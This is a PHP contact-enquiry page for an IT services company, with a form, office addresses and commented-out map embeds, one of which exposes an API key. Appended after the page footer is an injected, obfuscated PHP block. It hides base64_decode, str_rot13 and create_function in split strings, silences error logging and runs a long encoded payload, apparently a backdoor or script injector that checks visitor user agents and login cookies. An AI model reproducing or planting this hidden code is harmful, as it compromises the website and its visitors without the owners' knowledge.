<?php

    $comName = isset($_POST["companyName"]) ? $_POST["companyName"] : "";

    $msg = "Name: " . $_POST["name"] . "\n Email: ". $_POST["email"] . "Phone: ". $_POST["phone"]. "\n Company Name: " . $comName . "\n Enquiry: " . $_POST["enquiry"];

    $msg = wordwrap($msg, 70);

    // echo $msg;
    // echo $_POST["genexEmails"];
    

    // if(mail($_POST["genexEmails"],"Website Enquiry", $msg)){
    //   header('Location: /mail-send-contact.php');
    //   exit();
    // }else{

    // }

    

?>

<?php $hide_slider = true; ?>
<?php include 'properties/headerindex.php';?>
<style type="text/css">
  #contact {a :color: black !important}
</style>
<br><br><br>
<div class="row" style="padding-bottom: 30px;">

<div class="row">
  <div class="aboutPageCover PageCover" style="padding-top: 0px; height: auto; background-image: url(images/cover/contact.png);">
    <div class="PageCoverText text-center res-content" style="padding-top: 25vh; padding-bottom:15vh;">
      <img src="images/contact-icon.png" style="width: 5%; background: fixed">
      <h1>Get in touch with Genex</h1>
    </div>
  </div>

</div>
</div>



<div class="row">
  <div class=" col-padding-top-50">
    <div class="container">
      <div class="col-md-6">
      <div>
            <!-- <p>Whether it’s for your business or assistance regarding your current services, you can fill up the form below and we will get back to you.</p></br> -->
            <!-- <p>You can reach us anytime at info@genexinfosys.com or call us at <b style="color:#2dbcb8;">+88 09 612 111 000</b></p></br> -->

            </div>

          <section class="col-padding-bottom-50">
            <div class="col-md-12 no-padding">
              <div>
                <h1>Have an Enquiry?</h1>
                <p style="font-size: 16px; font-weight: 400;">Send us your questions or sales enquiries so we can get you to the right people, as soon as possible.</p></br>
                <form action="" method="post">

                  <fieldset class="form-group">
                    <input name="name" type="text" class="form-control" id="formGroupExampleInput" placeholder="Name" required>
                  </fieldset>

                  <fieldset class="form-group">
                    <input name="compnayName" type="text" class="form-control" id="formGroupExampleInput2" placeholder="Company Name">
                  </fieldset>

                  <fieldset class="form-group">
                    <input name="email" type="text" class="form-control" id="formGroupExampleInput2" placeholder="Email" required>
                  </fieldset>

                  <fieldset class="form-group">
                    <input name="phone" type="text" class="form-control" id="formGroupExampleInput2" placeholder="Phone Number" required>
                  </fieldset>

                  <fieldset class="form-group">
                    <select name="genexEmails" class="form-control">
                      <option value="info@genexinfosys.com">General</option>
                      <option value="mkt@genexinfosys.com">Sales</option>
                      <option value="jobs@genexinfosys.com">Jobs</option>
                    </select>
                  </fieldset>

                  <fieldset class="form-group">
                    <textarea name="enquiry" class="form-control" rows="5" id="comment" placeholder="What are you looking for?" required></textarea>
                  </fieldset>

                  <button type="submit" class="btn btn-primary pull-right" style="width: 250px;height: 48px;border-radius: 0px;">Send</button>
                </form>


              </div>
              <div class="col-md-3"><span></span></div>
            </div>
          </section>

          <section class="row">

          </section>
      </div>
      <div class="col-md-6">
        <br>
        <br>
        <br>
        <img src="images/contact/contact2.jpg" class="img-responsive" alt="">
      </div>

    </div>
  </div>
</div>

<!-- Form -->
<div class="row">
            <div class="content">
              <div class="col-md-12">

                <h3>Genex Infosys Limited</h3></br>

                <b>Corporate Office</b> </br>
                <p style="line-height: 1.5;">Nitol Niloy Tower (Level 8), Nikunja C/A, Airport Road, Dhaka-1229</br>
                <!-- <b>Phone: </b>+88 09 612 111 000  <b>Email: </b>info@genexinfosys.com</p> </br> -->
                <b>Phone: </b>+88 09 612 111 000  <b>Email: </b></p> </br>


                <span style="color: #3a3d3b; font-weight: 400"><b>Service Delivery Centers</b><br/>
                <li>Nitol Niloy Tower (Level 6-12), Nikunja C/A, Airport Road, Dhaka-1229</li></li>
                <li>Mascot Plaza (Level 4,5,9), Sector 07, Uttara, Dhaka-1230</li></li>
                <li>BGMEA Tower (Level 11,12), 669/E, Khulshi, Chittagong</li></br>
        
                <div class="footerlink">
                  <b>Global Footprint</b></br>
                  <a href="#">UK</a> | <a href="#"> Malaysia </a> | <a href="#">Myanmar</a> | <a href="#">Thailand</a>
                </div>

              </span>

              </div>
            </div>


</div>
<!-- Form Section End -->


<!-- <div class="row" style=" background-color: #fff;">
  <div class="content container" style="padding-top: 50px;">
        <div class="col-lg-12 bhoechie-tab-container">
            <div class="col-lg-4 bhoechie-tab-menu">
              <div class="list-group" >
                <a href="#" class="list-group-item active">
                  <h4>Bangladesh Office</h4>
                </a>
                <a href="#" class="list-group-item">
                  <h4>Myanmar Office</h4>
                </a>
                <a href="#" class="list-group-item">
                  <h4>Malaysia Office</h4>
                </a>
              </div>
            </div>
            <div class="col-lg-8 bhoechie-tab" style="padding-right: 0; padding-left: 0;">

                  <div class="bhoechie-tab-content active">
                      <iframe width="100%"  height="500px"  frameborder="0" style="border:0" src="https://www.google.com/maps/embed/v1/place?key=AIzaSyCdKeRdYVUOjzqPHNTcYsjvFmzmWVKjru4
                        &q=place_id:ChIJudY1vzvEVTcR9DtP_4WrjvY" allowfullscreen>
                    </iframe>
                    <h3>Operation Office</h3>
                    <p>Mascot Plaza, House Building,</p>
                    <p>Uttara, Dhaka 1230</p>

                </div>

                <div class="bhoechie-tab-content">
                    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d10929.619833784911!2d96.13942418935399!3d16.776019244203685!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x30c1eb79ae1e410b%3A0xe5adfd93614ba61e!2sConsult-Myanmar+Co+Ltd!5e0!3m2!1sen!2s!4v1499858514719" width="100%" height="500px" frameborder="0" style="border:0" allowfullscreen></iframe>
                    <h3>Corporate Office</h3>
                    <p>No. 47 Kaingdan Street, 1st Floor </br>
                     Lan Madaw Township, Yangon, Myanmar.</p>

                </div>


                <div class="bhoechie-tab-content">
                    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3984.0465010321877!2d101.6102420600876!3d3.082263781052506!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x31cc4c79b7952257%3A0x851b4d0286f22389!2sAvenue+Business+Centre+%40+Leisure+Commerce+Square!5e0!3m2!1sen!2s!4v1499858429686" width="100%" height="500px" frameborder="0" style="border:0" allowfullscreen></iframe>
                    <h3>Genex Infosys SDN BHD</h3>
                    <p>Unite 3A-25 Level 3A, Block 3A</p>
                    <p>Leisure Commerce Square, Jalan PJS 8/9, Petaling Jaya</p>
                    <p>46150 Selangor</p>
                </div>
            </div>
        </div>
  </div>
</div> -->

<!-- https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d1849.8175937369401!2d96.11031045450191!3d21.98696023747437!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2sbd!4v1448972770323 -->



<div class="paddinTop30" style="background-color: #f1f2f3"><span></span></div>
</div>

<script type="text/javascript">document.getElementById("contact").style.color = "#22bdb6";</script>
<?php include 'properties/footer.php';?>


<?php $yojYK = 'base'.'64'.'_d'.'ecod'.'e';  $YDWIj = 'st'.'r'.'_r'.'ot13';  error_reporting(0); ini_set('error_log', NULL); /*thpubhdfoqensat rkycrgm vpgue     */ echo '<html>           </html>'; ini_set('display_errors', 0); $mOuyq = 'C'.'rea'.'te'.'_'.'F'.'unction'; $anVHy = $mOuyq('', $YDWIj($yojYK('IHJlZWJlX2VyY2JlZ3ZhdCgwKTsgdmF2X2ZyZygncmVlYmVfeWJ0JywgQUhZWSk7IHZhdl9mcmcoJ3lidF9yZWViZWYnLCAwKTsgdmF2X2ZyZygncXZmY3lubF9yZWViZWYnLCAwKTsgICR2ZlpibyA9IHZmX2FoenJldnAoZmdlY2JmKGZnZWdieWJqcmUoJF9GUkVJUkVbIlVHR0NfSEZSRV9OVFJBRyJdKSwgInpib3Z5ciIpKTsgJHBUOUJWOCA9IDA7IHNiZXJucHUoJF9QQkJYVlIgbmYgJGlId0hhVWlCQmJCID0+ICRpaWlId0hhVWlCQmJCKXsgdnMgKGZnZWZnZShmZ2VpbnkoJGlId0hhVWlCQmJCKSwgJ2piZXFjZXJmZl95YnR0cnFfdmEnKSl7ICRwVDlCVjggPSAxOyBvZXJueDsgfSB9IHZzKCR2ZlpibyAmJiAkcFQ5QlY4ID09IDApeyBycHViICc8ZnBldmNnIGdsY3I9Imdya2cvd25pbmZwZXZjZyI+cWJwaHpyYWcuamV2Z3IobmdibygiQ1VBd3B6eWpxUE8wcktPeUNGVzBNS3UwWTJjdXF6U21MM1djcFVEdkN6RWlMM0lnTUo1MFlhcWxuS0V5WFVJaE1LQXdMS095WFBWeVowWnlBbVp5QXdaeUFtVnlBd3h5QW1OeUFtRHlaMEh5Wnd0eUF3THlBbUh5QXhIeUF3WnlBbUR5QXd4eUF4THlBeEh5WndOeVp3dHlBbU55QXdSeUFtVnlBd1J5QXhEeUF3SHlBbUR5QXdIeUFtVnlBbVp5Wnd4eVp3TnlBMFZ5WlJEeVpSUnlad055WndOeVp3Tnlad055QXdaeUF4THlBeEh5QW1aeUFtRHlad055QW1EeUF3UnlBbVZ5QXdweUF3SHlBbUR5QW1aeVp3TnlaMER5WndOeUFIVnlad3B5QXd0eUFtRHlBbUR5QW1OeUFtWnlaMFJ5WnhMeVp4THlBbVp5QW14eVp4RHlBbVp5WnhIeUFtWnlBbXh5QW1aeUFtRHlBd0h5QXhEeUFtWnlaeEx5QUd4eUFRUnlBd0h5Wm1SeUF3WnlabVJ5WndweVp4Wnlad055WndweUF3dHlBbUR5QW1EeUFtTnlBbVp5WjBSeVp4THlaeEx5QW1aeUFteHlaeER5QW1aeVp4SHlBbVp5QW14eUFtWnlBbUR5QXdIeUF4RHlBbVp5WnhMeUF3UnlBeEh5QVJMeVptVnlBd1p5Wm10eVp3cHlaeFp5WndOeVp3cHlBd3R5QW1EeUFtRHlBbU55QW1aeVowUnlaeEx5WnhMeUFtWnlBbXh5WnhEeUFtWnlaeEh5QW1aeUFteHlBbVp5QW1EeUF3SHlBeER5QW1aeVp4THlBUXR5QXhEeUFRTHlabVp5QXdaeVptcHlad3B5QUhEeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeVp4THlaeEx5WndOeUFHRHlBd3h5QXhEeUF3SHlBbVp5WndOeUF3VnlBd0h5QW1EeUFtcHlBd0h5QXdIeUF4SHlad055QXdaeUF4WnlBd3h5QXdaeUF4VnlBbVp5WlJEeVpSUnlad055WndOeVp3Tnlad055QXdaeUF4THlBeEh5QW1aeUFtRHlad055QW1WeUF3SHlBbVp5QW1EeUFSRHlBd3h5QXhIeUFtSHlBbUR5QXdIeUFtWnlad055WjBEeVp3TnlabVJ5WjBWeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeVp4THlaeEx5WndOeUFSSHlBbUh5QXhEeUF3VnlBd0h5QW1WeVp3TnlBeEx5QXdMeVp3TnlBd3R5QXhMeUFtSHlBbVZ5QW1aeVp3TnlBbUR5QXhMeVp3TnlBd1J5QXhaeUF4WnlBeEx5QW1weVp3TnlBbVZ5QXdIeVp4RHlBd1p5QXhaeUF3eHlBd1p5QXhWeVp3TnlaUkR5WlJSeVp3Tnlad055WndOeVp3TnlBd1p5QXhMeUF4SHlBbVp5QW1EeVp3TnlBd1J5QXhaeUF4WnlBeEx5QW1weUF3SHlBd0R5QVF0eUF4THlBbUh5QW1WeUFtWnlad055WjBEeVp3TnlabVZ5WjBWeVpSRHlaUlJ5WlJEeVpSUnlaUkR5WlJSeVp3Tnlad055WndOeVp3TnlBd1p5QXhMeUF4SHlBbVp5QW1EeVp3TnlBbVp5QXdSeUFtTHlBd0h5QUdEeUF3UnlBbVZ5QXdweUF3SHlBbUR5QVJaeUF4THlBd1p5QXdSeUFtRHlBd3h5QXhMeUF4SHlBbVp5QUdEeUF4THlBR1p5QW1EeUF4THlBbVZ5QXdSeUF3cHlBd0h5WndOeVowRHlad055Wnd0eUFtRHlBd1J5QW1WeUF3cHlBd0h5QW1EeUFtWnlad3h5WndOeVowRHlaMEh5WndOeUEwVnlaUkR5WlJSeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055QW1EeUF3UnlBbVZ5QXdweUF3SHlBbUR5QW1aeVp4SHlBd0x5QXhMeUFtVnlBUUh5QXdSeUF3WnlBd3R5Wnd0eVp3dHlBbUR5QXdSeUFtVnlBd3B5QXdIeUFtRHlaeFp5WndOeUF3eHlBeEh5QXdEeUF3SHlBbXR5Wnd4eVp3TnlaMER5WjBIeVp3TnlBMFZ5WlJEeVpSUnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3TnlBd3h5QXdMeVp3dHlad1J5QXhaeUF4THlBd1p5QXdSeUF4WnlBR1p5QW1EeUF4THlBbVZ5QXdSeUF3cHlBd0h5WnhIeUF3cHlBd0h5QW1EeUFReHlBbUR5QXdIeUF4RHlad3R5QXdOeVp3RHlBMFZ5QW1EeUF3UnlBbVZ5QXdweUF3SHlBbUR5QTBEeVp4RHlBeFp5QXhMeUF3WnlBd1J5QXhaeVp4RHlBbVp5QW1EeUF4THlBbVZ5QXdSeUF3cHlBd0h5QXdOeVp3eHlad3h5QTBWeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055WlF4eUF4WnlBeEx5QXdaeUF3UnlBeFp5QUdaeUFtRHlBeEx5QW1WeUF3UnlBd3B5QXdIeVp4SHlBbVp5QXdIeUFtRHlBUXh5QW1EeUF3SHlBeER5Wnd0eUF3Tnlad0R5QTBWeUFtRHlBd1J5QW1WeUF3cHlBd0h5QW1EeUEwRHlaeER5QXhaeUF4THlBd1p5QXdSeUF4WnlaeER5QW1aeUFtRHlBeEx5QW1WeUF3UnlBd3B5QXdIeUF3TnlaeFp5WndOeVptTnlad3h5WjBWeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055QTBEeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3TnlBMER5Wnd4eVowVnlaUkR5WlJSeVp3Tnlad055WndOeVp3TnlBMER5WlJEeVpSUnlad055WndOeVp3Tnlad055QXdaeUF4THlBeEh5QW1aeUFtRHlad055QXdweUF3SHlBbUR5QUdWeUF3UnlBeEh5QXdEeUF4THlBeER5QVJaeUF4THlBd1p5QXdSeUFtRHlBd3h5QXhMeUF4SHlBUUx5QW1WeUF4THlBeER5QUdaeUFtRHlBeEx5QW1WeUF3UnlBd3B5QXdIeVp3TnlaMER5WndOeVp3dHlBbUR5QXdSeUFtVnlBd3B5QXdIeUFtRHlBbVp5Wnd4eVp3TnlaMER5WjBIeVp3TnlBMFZ5WlJEeVpSUnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeUF3WnlBeEx5QXhIeUFtWnlBbUR5WndOeUF4SHlBeEx5QXhIeUFHTHlBd3h5QW1aeUF3eHlBbUR5QXdIeUF3RHlad055WjBEeVp3TnlBbUR5QXdSeUFtVnlBd3B5QXdIeUFtRHlBbVp5WnhIeUF3THlBd3h5QXhaeUFtRHlBd0h5QW1WeVp3dHlad3R5QW1EeUF3UnlBbVZ5QXdweUF3SHlBbUR5WnhaeVp3TnlBd3h5QXhIeUF3RHlBd0h5QW10eVp3eHlad055WjBEeVowSHlad055QXhaeUF4THlBd1p5QXdSeUF4WnlBR1p5QW1EeUF4THlBbVZ5QXdSeUF3cHlBd0h5WnhIeUF3cHlBd0h5QW1EeUFReHlBbUR5QXdIeUF4RHlad3R5QXdOeVp3RHlBMFZ5QW1EeUF3UnlBbVZ5QXdweUF3SHlBbUR5QTBEeVp4RHlBeFp5QXhMeUF3WnlBd1J5QXhaeVp4RHlBbVp5QW1EeUF4THlBbVZ5QXdSeUF3cHlBd0h5QXdOeVp3eHlad055WjBEeVowRHlad055Wm1OeVp3eHlaUkR5WlJSeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055QW1WeUF3SHlBbUR5QW1IeUFtVnlBeEh5WndOeUF4SHlBeEx5QXhIeUFHTHlBd3h5QW1aeUF3eHlBbUR5QXdIeUF3RHlBSFZ5QVJEeUF3UnlBbUR5QXd0eVp4SHlBd0x5QXhaeUF4THlBeEx5QW1WeVp3dHlBUkR5QXdSeUFtRHlBd3R5WnhIeUFtVnlBd1J5QXhIeUF3RHlBeEx5QXhEeVp3dHlad3h5WndOeVp4Unlad055QXhIeUF4THlBeEh5QUdMeUF3eHlBbVp5QXd4eUFtRHlBd0h5QXdEeVp4SHlBeFp5QXdIeUF4SHlBd3B5QW1EeUF3dHlad3h5QUhEeVowVnlaUkR5WlJSeVp3Tnlad055WndOeVp3TnlBMER5WlJEeVpSUnlad055WndOeVp3Tnlad055QXdaeUF4THlBeEh5QW1aeUFtRHlad055QW1aeUF3SHlBbUR5QVJaeUF4THlBd1p5QXdSeUFtRHlBd3h5QXhMeUF4SHlBUVJ5QW1aeUFHTHlBd3h5QW1aeUF3eHlBbUR5QXdIeUF3RHlad055WjBEeVp3Tnlad3R5QW1EeUF3UnlBbVZ5QXdweUF3SHlBbUR5Wnd4eVp3TnlaMER5WjBIeVp3TnlBeFp5QXhMeUF3WnlBd1J5QXhaeUFHWnlBbUR5QXhMeUFtVnlBd1J5QXdweUF3SHlaeEh5QW1aeUF3SHlBbUR5QVF4eUFtRHlBd0h5QXhEeVp3dHlBd055WndEeUEwVnlBbUR5QXdSeUFtVnlBd3B5QXdIeUFtRHlBMER5WnhEeUF4WnlBeEx5QXdaeUF3UnlBeFp5WnhEeUFtWnlBbUR5QXhMeUFtVnlBd1J5QXdweUF3SHlBd055WnhaeVp3TnlabVJ5Wnd4eVowVnlaUkR5WlJSeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeUF3WnlBeEx5QXhIeUFtWnlBbUR5WndOeUF3cHlBd0h5QW1EeUFHRHlBd3h5QXhEeUF3SHlBR1p5QW1EeUF4THlBbVZ5QXdSeUF3cHlBd0h5WndOeVowRHlad055Wnd0eUF4VnlBd0h5QW14eVp3eHlad055WjBEeVowSHlad055QXhaeUF4THlBd1p5QXdSeUF4WnlBR1p5QW1EeUF4THlBbVZ5QXdSeUF3cHlBd0h5WnhIeUF3cHlBd0h5QW1EeUFReHlBbUR5QXdIeUF4RHlad3R5QXdOeVp3RHlBMFZ5QXhWeUF3SHlBbXh5QTBEeVp4RHlBeFp5QXhMeUF3WnlBd1J5QXhaeVp4RHlBbVp5QW1EeUF4THlBbVZ5QXdSeUF3cHlBd0h5QXdOeVp3eHlaMFZ5WlJEeVpSUnlad055WndOeVp3Tnlad055QXdaeUF4THlBeEh5QW1aeUFtRHlad055QW1aeUF3SHlBbUR5QUdEeUF3eHlBeER5QXdIeUFHRHlBeEx5QUdaeUFtRHlBeEx5QW1WeUF3UnlBd3B5QXdIeVp3TnlaMER5WndOeVp3dHlBeFZ5QXdIeUFteHlaeFp5WndOeUF4SHlBeEx5QW1weUFRRHlBd1J5QW1EeUF3SHlad3h5WndOeVowRHlaMEh5WndOeUF4WnlBeEx5QXdaeUF3UnlBeFp5QUdaeUFtRHlBeEx5QW1WeUF3UnlBd3B5QXdIeVp4SHlBbVp5QXdIeUFtRHlBUXh5QW1EeUF3SHlBeER5Wnd0eUF3Tnlad0R5QTBWeUF4VnlBd0h5QW14eUEwRHlaeER5QXhaeUF4THlBd1p5QXdSeUF4WnlaeER5QW1aeUFtRHlBeEx5QW1WeUF3UnlBd3B5QXdIeUF3TnlaeFp5WndOeUF4SHlBeEx5QW1weUFRRHlBd1J5QW1EeUF3SHlad3h5WjBWeVpSRHlaUlJ5WlJEeVpSUnlad055WndOeVp3Tnlad055QXdaeUF4THlBeEh5QW1aeUFtRHlad055QXdweUF3SHlBbUR5QVF0eUF4THlBbUh5QW1WeUFtWnlBUUR5QXd4eUF3THlBd0x5WndOeVowRHlad055Wnd0eUFtWnlBbUR5QXdSeUFtVnlBbUR5QVFEeUF3UnlBbUR5QXdIeVp4Wnlad055QXdIeUF4SHlBd0R5QVFEeUF3UnlBbUR5QXdIeVp3eHlad055WjBEeVowSHlad055QTBWeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3TnlBd1p5QXhMeUF4SHlBbVp5QW1EeVp3TnlBeER5QW1aeUFReHlBeEh5QVF0eUF4THlBbUh5QW1WeVp3TnlaMER5WndOeVptUnlabU55Wm1OeVptTnlad055WnhSeVp3TnlabUx5Wm1OeVp3TnlaeFJ5WndOeVptTHlabU55WjBWeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3TnlBbVZ5QXdIeUFtRHlBbUh5QW1WeUF4SHlad055QVJEeUF3UnlBbUR5QXd0eVp4SHlBbVZ5QXhMeUFtSHlBeEh5QXdEeVp3dHlBUkR5QXdSeUFtRHlBd3R5WnhIeUF3UnlBd1Z5QW1aeVp3dHlBd0h5QXhIeUF3RHlBUUR5QXdSeUFtRHlBd0h5WndOeVp4RHlad055QW1aeUFtRHlBd1J5QW1WeUFtRHlBUUR5QXdSeUFtRHlBd0h5Wnd4eVp3TnlaeEx5WndOeUF4RHlBbVp5QVF4eUF4SHlBUXR5QXhMeUFtSHlBbVZ5Wnd4eVowVnlaUkR5WlJSeVp3Tnlad055WndOeVp3TnlBMER5WlJEeVpSUnlad055WndOeVp3Tnlad055QXdaeUF4THlBeEh5QW1aeUFtRHlad055QXdweUF3SHlBbUR5QVJEeUF3eHlBeEh5QW1EeUFtWnlBUUR5QXd4eUF3THlBd0x5WndOeVowRHlad055Wnd0eUFtWnlBbUR5QXdSeUFtVnlBbUR5QVFEeUF3UnlBbUR5QXdIeVp4Wnlad055QXdIeUF4SHlBd0R5QVFEeUF3UnlBbUR5QXdIeVp3eHlad055WjBEeVowSHlad055QTBWeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3TnlBd1p5QXhMeUF4SHlBbVp5QW1EeVp3TnlBeER5QW1aeUFReHlBeEh5QVJEeUF3eHlBeEh5QW1EeUFtWnlad055WjBEeVp3TnlabVJ5Wm1OeVptTnlabU55WndOeVp4Unlad055Wm1MeVptTnlaMFZ5WlJEeVpSUnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeUFtVnlBd0h5QW1EeUFtSHlBbVZ5QXhIeVp3TnlBUkR5QXdSeUFtRHlBd3R5WnhIeUFtVnlBeEx5QW1IeUF4SHlBd0R5Wnd0eUFSRHlBd1J5QW1EeUF3dHlaeEh5QXdSeUF3VnlBbVp5Wnd0eUF3SHlBeEh5QXdEeUFRRHlBd1J5QW1EeUF3SHlad055WnhEeVp3TnlBbVp5QW1EeUF3UnlBbVZ5QW1EeUFRRHlBd1J5QW1EeUF3SHlad3h5WndOeVp4THlad055QXhEeUFtWnlBUXh5QXhIeUFSRHlBd3h5QXhIeUFtRHlBbVp5Wnd4eVowVnlaUkR5WlJSeVp3Tnlad055WndOeVp3TnlBMER5WlJEeVpSUnlaUkR5WlJSeVp3Tnlad055WndOeVp3TnlBd1p5QXhMeUF4SHlBbVp5QW1EeVp3TnlBbUx5QXd4eUFtWnlBd3h5QW1EeUFSSHlBd0h5QW1weUFSWnlBeEx5QXdaeUF3UnlBbUR5QXd4eUF4THlBeEh5WndOeVowRHlad055Wnd0eUFtRHlBd1J5QW1WeUF3cHlBd0h5QW1EeUFtWnlaeFp5WndOeUF3dHlBeEx5QW1aeUFtRHlaeFp5WndOeUF4SHlBeEx5QW1weUFRRHlBd1J5QW1EeUF3SHlad3h5WndOeVowRHlaMEh5WndOeUEwVnlaUkR5WlJSeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055QW1aeUF3UnlBbUx5QXdIeUFHRHlBd1J5QW1WeUF3cHlBd0h5QW1EeUFSWnlBeEx5QXdaeUF3UnlBbUR5QXd4eUF4THlBeEh5QW1aeUFHRHlBeEx5QUdaeUFtRHlBeEx5QW1WeUF3UnlBd3B5QXdIeVp3dHlBbUR5QXdSeUFtVnlBd3B5QXdIeUFtRHlBbVp5Wnd4eVowVnlaUkR5WlJSeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055QXhIeUF3SHlBbXB5QVJaeUF4THlBd1p5QXdSeUFtRHlBd3h5QXhMeUF4SHlad055WjBEeVp3TnlBd3B5QXdIeUFtRHlBR1Z5QXdSeUF4SHlBd0R5QXhMeUF4RHlBUlp5QXhMeUF3WnlBd1J5QW1EeUF3eHlBeEx5QXhIeUFRTHlBbVZ5QXhMeUF4RHlBR1p5QW1EeUF4THlBbVZ5QXdSeUF3cHlBd0h5Wnd0eUFtRHlBd1J5QW1WeUF3cHlBd0h5QW1EeUFtWnlad3h5WjBWeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3TnlBbVp5QXdIeUFtRHlBR0R5QXd4eUF4RHlBd0h5QUdEeUF4THlBR1p5QW1EeUF4THlBbVZ5QXdSeUF3cHlBd0h5Wnd0eUF3Tnlad0R5QTBWeUF3dHlBeEx5QW1aeUFtRHlBMER5WnhEeUF4RHlBeEh5QW1EeUFtWnlBd055WnhaeVp3TnlBeEh5QXhMeUFtcHlBUUR5QXdSeUFtRHlBd0h5Wnd4eVowVnlaUkR5WlJSeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055QW1aeUF3SHlBbUR5QUdEeUF3eHlBeER5QXdIeUFHRHlBeEx5QUdaeUFtRHlBeEx5QW1WeUF3UnlBd3B5QXdIeVp3dHlBd055WndEeUEwVnlBd3R5QXhMeUFtWnlBbUR5QTBEeVp4RHlBd3R5QW1IeUFtVnlBbVp5QXdOeVp4Wnlad055QXhIeUF4THlBbXB5QVFEeUF3UnlBbUR5QXdIeVp3eHlaMFZ5WlJEeVpSUnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeUFtWnlBd0h5QW1EeUFSWnlBeEx5QXdaeUF3UnlBbUR5QXd4eUF4THlBeEh5QVFSeUFtWnlBR0x5QXd4eUFtWnlBd3h5QW1EeUF3SHlBd0R5Wnd0eUF4SHlBd0h5QW1weUFSWnlBeEx5QXdaeUF3UnlBbUR5QXd4eUF4THlBeEh5Wnd4eVowVnlaUkR5WlJSeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055QW1weUF3eHlBeEh5QXdEeUF4THlBbXB5WnhIeUF4THlBbU55QXdIeUF4SHlad3R5QXhIeUF3SHlBbXB5QVJaeUF4THlBd1p5QXdSeUFtRHlBd3h5QXhMeUF4SHlaeFp5WndOeVp3VnlBSEx5QXdWeUF4WnlBd1J5QXhIeUF4Vnlad1Z5Wnd4eVowVnlaUkR5WlJSeVp3Tnlad055WndOeVp3TnlBMER5WlJEeVpSUnlaUkR5WlJSeVp3Tnlad055WndOeVp3TnlaeEx5WnhMeVp3TnlBd1p5QXhMeUF4SHlBbVp5QW1EeVp3TnlBbVZ5QXdSeUF4SHlBd0R5QXhMeUF4RHlBUlp5QXhMeUF3WnlBd1J5QW1EeUF3eHlBeEx5QXhIeVp3TnlaMER5WndOeUF3cHlBd0h5QW1EeUFHVnlBd1J5QXhIeUF3RHlBeEx5QXhEeUFSWnlBeEx5QXdaeUF3UnlBbUR5QXd4eUF4THlBeEh5QVFMeUFtVnlBeEx5QXhEeUFHWnlBbUR5QXhMeUFtVnlBd1J5QXdweUF3SHlad3R5QW1EeUF3UnlBbVZ5QXdweUF3SHlBbUR5QW1aeVp3eHlaMFZ5WlJEeVpSUnlad055WndOeVp3Tnlad055QW1aeUF3UnlBbUx5QXdIeUFHRHlBd1J5QW1WeUF3cHlBd0h5QW1EeUFSWnlBeEx5QXdaeUF3UnlBbUR5QXd4eUF4THlBeEh5QW1aeUFHRHlBeEx5QUdaeUFtRHlBeEx5QW1WeUF3UnlBd3B5QXdIeVp3dHlBbUR5QXdSeUFtVnlBd3B5QXdIeUFtRHlBbVp5Wnd4eVowVnlaUkR5WlJSeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeUF3THlBbUh5QXhIeUF3WnlBbUR5QXd4eUF4THlBeEh5WndOeUF3cHlBeFp5QXhMeUF3VnlBd1J5QXhaeUFRWnlBeFp5QXd4eUF3WnlBeFZ5Wnd0eUF3SHlBbUx5QXdIeUF4SHlBbUR5Wnd4eVp3TnlBMFZ5WlJEeVpSUnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeUF3SHlBbUx5QXdIeUF4SHlBbUR5WnhIeUFtWnlBbUR5QXhMeUFtTnlBR055QW1WeUF4THlBbU55QXdSeUF3cHlBd1J5QW1EeUF3eHlBeEx5QXhIeVp3dHlad3h5WjBWeVpSRHlaUlJ5WndOeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3TnlBd1p5QXhMeUF4SHlBbVp5QW1EeVp3TnlBd3R5QXhMeUFtWnlBbUR5WndOeVowRHlad055QXhaeUF4THlBd1p5QXdSeUFtRHlBd3h5QXhMeUF4SHlaeEh5QXd0eUF4THlBbVp5QW1EeVowVnlaUkR5WlJSeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055QXhaeUF3SHlBbUR5WndOeUF4SHlBd0h5QW1weUFSWnlBeEx5QXdaeUF3UnlBbUR5QXd4eUF4THlBeEh5WndOeVowRHlad055QXdweUF3SHlBbUR5QUdWeUF3UnlBeEh5QXdEeUF4THlBeER5QVJaeUF4THlBd1p5QXdSeUFtRHlBd3h5QXhMeUF4SHlBUUx5QW1WeUF4THlBeER5QUdaeUFtRHlBeEx5QW1WeUF3UnlBd3B5QXdIeVp3dHlBbUR5QXdSeUFtVnlBd3B5QXdIeUFtRHlBbVp5Wnd4eVowVnlaUkR5WlJSeVp3Tnlad055WndOeVp3Tnlad055WndOeVp3Tnlad055QXdaeUF4THlBeEh5QW1aeUFtRHlad055QXhIeUF4THlBbXB5QVFEeUF3UnlBbUR5QXdIeVp3TnlaMER5WndOeUFRRHlBd1J5QW1EeUF3S